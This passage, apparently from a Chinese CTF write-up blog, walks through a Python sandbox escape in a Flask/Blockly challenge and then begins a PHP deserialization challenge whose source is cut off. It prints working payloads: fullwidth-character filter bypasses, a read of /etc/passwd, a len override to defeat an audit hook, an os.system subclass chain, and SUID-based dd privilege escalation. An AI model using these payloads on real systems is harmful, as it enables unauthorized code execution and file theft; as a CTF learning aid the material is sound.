class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="依然没有环境，flask框架启动一下，发现没有index-html，index-html里面本来是能发出post请求的，然后我们就能通过发出的post进行一下修改来py沙箱逃逸"><a href="#依然没有环境，flask框架启动一下，发现没有index-html，index-html里面本来是能发出post请求的，然后我们就能通过发出的post进行一下修改来py沙箱逃逸" class="headerlink" title="依然没有环境，flask框架启动一下，发现没有index.html，index.html里面本来是能发出post请求的，然后我们就能通过发出的post进行一下修改来py沙箱逃逸"></a>依然没有环境，flask框架启动一下，发现没有index.html，index.html里面本来是能发出post请求的，然后我们就能通过发出的post进行一下修改来py沙箱逃逸</h3><h3 id="还是先审计一下代码吧，主函数处理post请求-json-to-python-block-to-python-check-for-blacklisted-symbols-do-python-code-verify-secure"><a href="#还是先审计一下代码吧，主函数处理post请求-json-to-python-block-to-python-check-for-blacklisted-symbols-do-python-code-verify-secure" class="headerlink" title="还是先审计一下代码吧，主函数处理post请求(json_to_python-&gt;block_to_python-&gt;check_for_blacklisted_symbols)-&gt;do(python_code)-&gt;verify_secure"></a>还是先审计一下代码吧，<code>主函数处理post请求(json_to_python-&gt;block_to_python-&gt;check_for_blacklisted_symbols)-&gt;do(python_code)-&gt;verify_secure</code></h3><h3 id="重点在do函数里面，他会写入run-py并运行，这就给了我们任意代码执行的漏洞，但是阻碍也很多，我们来一一攻破"><a href="#重点在do函数里面，他会写入run-py并运行，这就给了我们任意代码执行的漏洞，但是阻碍也很多，我们来一一攻破" class="headerlink" title="重点在do函数里面，他会写入run.py并运行，这就给了我们任意代码执行的漏洞，但是阻碍也很多，我们来一一攻破"></a>重点在do函数里面，他会写入run.py并运行，这就给了我们任意代码执行的漏洞，但是阻碍也很多，我们来一一攻破</h3><h3 id="首先是check-for-blacklisted-symbols-他会检测是否有blacklist-pattern里面的符号，如果有，则无法写入text模块，也就是限制我们不能有blacklist-pattern里面的符号，但是如果没有，他会执行unidecode函数"><a href="#首先是check-for-blacklisted-symbols-他会检测是否有blacklist-pattern里面的符号，如果有，则无法写入text模块，也就是限制我们不能有blacklist-pattern里面的符号，但是如果没有，他会执行unidecode函数" class="headerlink" title="首先是check_for_blacklisted_symbols,他会检测是否有blacklist_pattern里面的符号，如果有，则无法写入text模块，也就是限制我们不能有blacklist_pattern里面的符号，但是如果没有，他会执行unidecode函数"></a>首先是check_for_blacklisted_symbols,他会检测是否有blacklist_pattern里面的符号，如果有，则无法写入text模块，也就是限制我们不能有blacklist_pattern里面的符号，但是如果没有，他会执行unidecode函数</h3><blockquote>
<p>unidecode 函数将文本中的特殊字符替换为与之最接近的 ASCII 字符，以产生一个干净的 ASCII 字符串。</p>
</blockquote>
<h3 id="所以我们可以利用这一点将我们想要用到的符号转换为特殊字符，且保证unidecode函数能将其变回来，这里偷懒不想一个个试了，应该全半角转换即可"><a href="#所以我们可以利用这一点将我们想要用到的符号转换为特殊字符，且保证unidecode函数能将其变回来，这里偷懒不想一个个试了，应该全半角转换即可" class="headerlink" title="所以我们可以利用这一点将我们想要用到的符号转换为特殊字符，且保证unidecode函数能将其变回来，这里偷懒不想一个个试了，应该全半角转换即可"></a>所以我们可以利用这一点将我们想要用到的符号转换为特殊字符，且保证unidecode函数能将其变回来，这里偷懒不想一个个试了，应该全半角转换即可</h3><h3 id="然后就是verify-secure，他会检测我们是否进行了import，对我们的代码进行了限制，不允许我们导入模块"><a href="#然后就是verify-secure，他会检测我们是否进行了import，对我们的代码进行了限制，不允许我们导入模块" class="headerlink" title="然后就是verify_secure，他会检测我们是否进行了import，对我们的代码进行了限制，不允许我们导入模块"></a>然后就是verify_secure，他会检测我们是否进行了import，对我们的代码进行了限制，不允许我们导入模块</h3><h3 id="最后就是hook-code，他会在我们写入的run-py前面加上一段代码进行代码运行检测，既ban掉了我们几个命令执行函数，也限制事件名称长度不超过4"><a href="#最后就是hook-code，他会在我们写入的run-py前面加上一段代码进行代码运行检测，既ban掉了我们几个命令执行函数，也限制事件名称长度不超过4" class="headerlink" title="最后就是hook_code，他会在我们写入的run.py前面加上一段代码进行代码运行检测，既ban掉了我们几个命令执行函数，也限制事件名称长度不超过4."></a>最后就是hook_code，他会在我们写入的run.py前面加上一段代码进行代码运行检测，既ban掉了我们几个命令执行函数，也限制事件名称长度不超过4.</h3><h3 id="这里偷一个wp里面的该题传参的json模版"><a href="#这里偷一个wp里面的该题传参的json模版" class="headerlink" title="这里偷一个wp里面的该题传参的json模版"></a>这里偷一个wp里面的该题传参的json模版</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;print&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;print1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text1&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ｓ＂＇）\nｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂， ＂ｒ＂）．ｒｅａｄ（））\n＃&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="这里通过修改text部分来进行代码执行，不过由于原代码是print-‘TEXT’-所以我们要先闭合print命令，再注释掉后面，才能进行代码执行，python里面用-n来断开命令"><a href="#这里通过修改text部分来进行代码执行，不过由于原代码是print-‘TEXT’-所以我们要先闭合print命令，再注释掉后面，才能进行代码执行，python里面用-n来断开命令" class="headerlink" title="这里通过修改text部分来进行代码执行，不过由于原代码是print(‘TEXT’),所以我们要先闭合print命令，再注释掉后面，才能进行代码执行，python里面用\n来断开命令"></a>这里通过修改text部分来进行代码执行，不过由于原代码是print(‘TEXT’),所以我们要先闭合print命令，再注释掉后面，才能进行代码执行，python里面用\n来断开命令</h3><p><img src="https://pick.lwzheng.tech/2025/02/10/67a9c06627f0d.png" alt="2fbc9ff1-3293-4ae7-aab6-c5b688daef63.png"></p>
<h3 id="这里open命令ai是能帮助想到的，但是实际环境中因为权限不足，只能读取-etc-passwd而不能读取诸如flag-txt-所以这里还要Linux-提权"><a href="#这里open命令ai是能帮助想到的，但是实际环境中因为权限不足，只能读取-etc-passwd而不能读取诸如flag-txt-所以这里还要Linux-提权" class="headerlink" title="这里open命令ai是能帮助想到的，但是实际环境中因为权限不足，只能读取&#x2F;etc&#x2F;passwd而不能读取诸如flag.txt,所以这里还要Linux 提权"></a>这里open命令ai是能帮助想到的，但是实际环境中因为权限不足，只能读取&#x2F;etc&#x2F;passwd而不能读取诸如flag.txt,所以这里还要Linux 提权</h3><h3 id="于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3"><a href="#于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3" class="headerlink" title="于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3"></a>于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3</h3><blockquote>
<p>“TEXT”: “ｓ＂＇）\n＿＿ｂｕｉｌｔｉｎｓ＿＿．ｌｅｎ　＝　ｌａｍｂｄａ　ｘ：　３\nｐｒｉｎｔ（ｌｅｎ（＂ａｓｄｂｂ＂））\n＃”</p>
</blockquote>
<h3 id="返回3则证明修改成功"><a href="#返回3则证明修改成功" class="headerlink" title="返回3则证明修改成功"></a>返回3则证明修改成功</h3><h3 id="然后就可以利用os-system，按照ssti模版注入的方式执行任意命令了-将下面的命令全半角转换，再替换掉上面的print命令即可"><a href="#然后就可以利用os-system，按照ssti模版注入的方式执行任意命令了-将下面的命令全半角转换，再替换掉上面的print命令即可" class="headerlink" title="然后就可以利用os.system，按照ssti模版注入的方式执行任意命令了,将下面的命令全半角转换，再替换掉上面的print命令即可"></a>然后就可以利用os.system，按照ssti模版注入的方式执行任意命令了,将下面的命令全半角转换，再替换掉上面的print命令即可</h3><blockquote>
<p><code>[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)</code></p>
</blockquote>
<h3 id="然后就是提权了，探测SUID文件"><a href="#然后就是提权了，探测SUID文件" class="headerlink" title="然后就是提权了，探测SUID文件"></a>然后就是提权了，探测SUID文件</h3><blockquote>
<p>SUID（Set User ID）文件是一种特殊权限的文件，它允许用户以文件所有者的权限运行该文件。如果未经授权的程序或用户能够越权读取这些文件，可能会导致敏感信息泄露、系统被攻击或权限被滥用。</p>
</blockquote>
<blockquote>
<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>&#x2F;表示从文件系统的顶部（根）开始并找到每个目录<br>-perm 表示搜索随后的权限<br>-u &#x3D; s表示查找root用户拥有的文件<br>-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）表示重定向<br>&#x2F;dev&#x2F;null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</p>
</blockquote>
<h3 id="这里会找到dd这个命令"><a href="#这里会找到dd这个命令" class="headerlink" title="这里会找到dd这个命令"></a>这里会找到dd这个命令</h3><blockquote>
<p>dd是一个在类Unix系统中用于复制文件并对原文件的内容进行转换和格式化处理的命令。其基本语法为dd [选项]，常见的选项有if（输入文件）、of（输出文件）等。</p>
</blockquote>
<h3 id="所以这里只需要dd-if-flag命令即可得到flag"><a href="#所以这里只需要dd-if-flag命令即可得到flag" class="headerlink" title="所以这里只需要dd if=/flag命令即可得到flag"></a>所以这里只需要<code>dd if=/flag</code>命令即可得到flag</h3><h3 id="没有环境还是坐牢"><a href="#没有环境还是坐牢" class="headerlink" title="没有环境还是坐牢"></a>没有环境还是坐牢</h3><h3 id="剩下两道都发过了"><a href="#剩下两道都发过了" class="headerlink" title="剩下两道都发过了"></a>剩下两道都发过了</h3><h1 id="web1234"><a href="#web1234" class="headerlink" title="web1234"></a>web1234</h1><h3 id="首先打开页面发现几乎啥也没有，关于这种啥也没有的肯定先dirsearch扫描一下，如果没扫描到有用的就查看一下robots-txt，这里是在robots-txt里面看到有www-zip这一个备份文件，下载下来发现是源文件，包含3个php文件"><a href="#首先打开页面发现几乎啥也没有，关于这种啥也没有的肯定先dirsearch扫描一下，如果没扫描到有用的就查看一下robots-txt，这里是在robots-txt里面看到有www-zip这一个备份文件，下载下来发现是源文件，包含3个php文件" class="headerlink" title="首先打开页面发现几乎啥也没有，关于这种啥也没有的肯定先dirsearch扫描一下，如果没扫描到有用的就查看一下robots.txt，这里是在robots.txt里面看到有www.zip这一个备份文件，下载下来发现是源文件，包含3个php文件"></a>首先打开页面发现几乎啥也没有，关于这种啥也没有的肯定先dirsearch扫描一下，如果没扫描到有用的就查看一下robots.txt，这里是在robots.txt里面看到有<a target="_blank" rel="noopener" href="http://www.zip这一个备份文件,下载下来发现是源文件,包含3个php文件/">www.zip这一个备份文件，下载下来发现是源文件，包含3个php文件</a></h3><h3 id="首先看一下index-php"><a href="#首先看一下index-php" class="headerlink" title="首先看一下index.php"></a>首先看一下index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$param</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] === <span class="variable">$Config</span>-&gt;uname &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>])) === <span class="variable">$Config</span>-&gt;passwd)&#123;</span><br><span class="line">    <span class="variable">$Admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$Config</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;edit&#x27;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$param</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$sex</span> = <span class="variable">$param</span>[<span class="string">&#x27;sex&#x27;</span>];</span><br><span class="line">        <span class="variable">$mail</span> = <span class="variable">$param</span>[<span class="string">&#x27;mail&#x27;</span>];</span><br><span class="line">        <span class="variable">$telnum</span> = <span class="variable">$param</span>[<span class="string">&#x27;telnum&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">editconf</span>(<span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;reset&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">resetconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;pls login! :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="这里面给出了我们登录的要求是uname和md5-md5-GET-‘passwd’-与Config对应的相同，所以我们去包含的class-php里面看看Config到底是什么。"><a href="#这里面给出了我们登录的要求是uname和md5-md5-GET-‘passwd’-与Config对应的相同，所以我们去包含的class-php里面看看Config到底是什么。" class="headerlink" title="这里面给出了我们登录的要求是uname和md5(md5($_GET[‘passwd’]))与Config对应的相同，所以我们去包含的class.php里面看看Config到底是什么。"></a>这里面给出了我们登录的要求是uname和md5(md5($_GET[‘passwd’]))与Config对应的相同，所以我们去包含的class.php里面看看Config到底是什么。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//安全获取基本信息，返回修改配置的表单</span></span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;nickname) ? <span class="variable">$Config</span>-&gt;nickname : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;sex) ? <span class="variable">$Config</span>-&gt;sex : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;mail) ? <span class="variable">$Config</span>-&gt;mail : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;telnum) ? <span class="variable">$Config</span>-&gt;telnum : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;    </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editconf</span>(<span class="params"><span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//编辑表单内容</span></span><br><span class="line">        <span class="variable">$Config</span> = <span class="variable language_">$this</span>-&gt;Config;</span><br><span class="line">        <span class="variable">$Config</span>-&gt;avatar = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$avatar</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/男|女/&quot;</span>, <span class="variable">$sex</span>, <span class="variable">$matches</span>) ? <span class="variable">$matches</span>[<span class="number">0</span>] : <span class="string">&quot;武装直升机&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.*@.*\..*/&#x27;</span>, <span class="variable">$mail</span>) ? <span class="variable">$mail</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = <span class="title function_ invoke__">substr</span>(<span class="variable">$telnum</span>, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$Config</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;record.php&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            [<span class="keyword">new</span> <span class="title class_">Log</span>(<span class="variable">$Config</span>),<span class="string">&quot;log&quot;</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resetconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//返回出厂设置</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;Tzo2OiJDb25maWciOjc6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO3M6MTA6Ii90bXAvMS5wbmciO3M6ODoibmlja25hbWUiO3M6MTU6IuWwj+eGiui9r+ezlk92TyI7czozOiJzZXgiO3M6Mzoi5aWzIjtzOjQ6Im1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo2OiJ0ZWxudW0iO3M6MTE6IjEyMzQ1Njc4OTAxIjt9&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="string">&quot;:(&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span 